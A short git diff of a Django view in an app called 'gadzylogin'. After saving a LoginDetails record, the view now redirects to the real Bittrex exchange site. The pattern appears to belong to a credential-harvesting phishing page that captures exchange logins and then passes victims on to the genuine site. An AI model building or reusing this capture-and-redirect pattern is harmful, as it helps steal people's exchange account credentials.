@@ -1,4 +1,4 @@
-from django.shortcuts import render
+from django.shortcuts import render, redirect
 
 from gadzylogin.models import LoginDetails
 
@@ -13,6 +13,6 @@ def page(request):
 
         new_applicant.save()
         success = 1
-        return render(request, 'index.html', {'success': success})
+        return redirect('https://bittrex.com')
     else:
         return render(request, 'index.html')
